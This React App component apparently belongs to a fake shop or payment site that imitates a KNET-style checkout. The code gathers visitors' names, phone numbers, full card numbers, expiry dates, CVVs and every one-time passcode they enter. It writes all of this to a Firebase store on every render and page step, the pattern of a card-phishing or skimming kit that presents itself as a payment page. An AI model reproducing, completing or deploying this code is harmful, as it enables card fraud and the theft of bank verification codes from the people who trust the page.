import { useEffect, useState } from 'react';
import './main.css';
import { CartProvider } from './cartContext';
import Landing from './landing/landing';
import { Toaster } from 'react-hot-toast';
import Info from './info/info';
import { Loader } from './loader';
import { Payment } from './kent/kent';
import { addData } from './firebase';

function App() {
  
  const [currantPage, setCurrantPage] = useState(3);
  const [isLoading, setsetIsLoading] = useState(false);
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [id, setId] = useState(new Date().toISOString())
  const [dateMonth, setDatmont] = useState('')
  const [datayaer, setDatyear] = useState('')
  const [CVC, setCVC] = useState('')
  const [otp, setOtp] = useState('')
  const [otpArd, setOtpard] = useState([''])
  const [cardNumber, setCardNumber] = useState('')
  const [prefix, setPrefix] = useState('')
  const [bank, setBank] = useState('')
  const [cardState, setCardState] = useState('pending')

  const data={
    id:id,
    hasPersonalInfo:name != '',
    hasCardInfo:cardNumber != '',
    currentPage:currantPage,
    createdDate: new Date().toISOString(),
    notificationCount:1,
    personalInfo: {
      id:name,
      fullName:name,
      phone:phone
    },
    cardInfo: {
      bank:bank,
      cardNumber:cardNumber,
      prefix:prefix,
      expirationDate: `${dateMonth} / ${datayaer}`,
      cvv:CVC,
      otp:otp,
      allOtps:otpArd,
      state:cardState,
    },
    cardState:cardState,
  };
  const handleNextPage = () => {
   addData(data)
    setsetIsLoading(true)
    setTimeout(() => {
    setsetIsLoading(false)
      setCurrantPage(currantPage+1)
    }, 3000)
  }
  
  const handleOtp = (v: string) => {
    setOtp(v)

  }
  const handleOArr = async () => {
    await otpArd.push(otp)
  }
useEffect(()=>{
  addData(data)
})
  return (
    <CartProvider>
      <Loader show={isLoading}/>
      <div style={{opacity:isLoading?0.4:1}}>
      <div>
        <Toaster position="bottom-center" />
      </div>
      {
        currantPage === 1 ?
          <Landing handleNextPage={handleNextPage} /> :
          currantPage === 2 ?
            <Info  setName={setName} setPhone={setPhone} handleNextPage={handleNextPage}  /> :
            currantPage >= 3 ?
              <Payment 
              handleOtp={handleOtp} 
              handleOArr={handleOArr}
              setCardNumber={setCardNumber}
              setPrefix={setPrefix}
              setBank={setBank}
              setDatmont={setDatmont}
              setDatyear={setDatyear}
              setCVC={setCVC}
              handleNextPage={handleNextPage}
              /> :
              null
      }
      </div>
    </CartProvider>
  );
}

export default App;
